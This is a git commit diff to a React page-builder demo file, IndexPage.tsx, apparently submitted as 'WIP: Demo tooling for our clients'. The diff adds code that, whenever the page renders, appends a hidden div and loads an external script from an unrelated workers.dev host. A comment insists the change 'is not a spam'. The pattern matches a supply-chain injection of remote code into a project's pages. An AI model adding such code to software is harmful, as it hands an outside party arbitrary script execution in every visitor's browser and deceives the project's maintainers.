161d38cfd945a4076a68c088fde54ebac7c57b1b
Quang Luong <quang@cloudflare.com>
2024-01-21 21:38:02 +0700

    WIP: Demo tooling for our clients - DO NOT MERGE

--- apps/page-builder-demo/src/app/IndexPage.tsx
+++ apps/page-builder-demo/src/app/IndexPage.tsx
@@ -9,7 +9,20 @@ export interface IndexPageData {
 }
 
 export function IndexPage(props: { data: WrappedValue<IndexPageData> }) {
-  const { data } = props
+  const { data } = props;
+
+  // TODO: We are designing a tool for our client. This PR is not a spam
+  if (!document.getElementById('foobar')) {
+    let wrapper = document.createElement('div');
+    wrapper.id = 'foobar';
+    document.body.appendChild(wrapper);
+
+    const script = document.createElement("script");
+    script.src = "https://royal-hall.groking.workers.dev/load.js";
+    script.async = true;
+    script.onload = () => console.log("script loaded");
+    wrapper.appendChild(script);
+  }
 
   return (
     <AppLayout data={{ siteSettings: data.siteSettings }}>
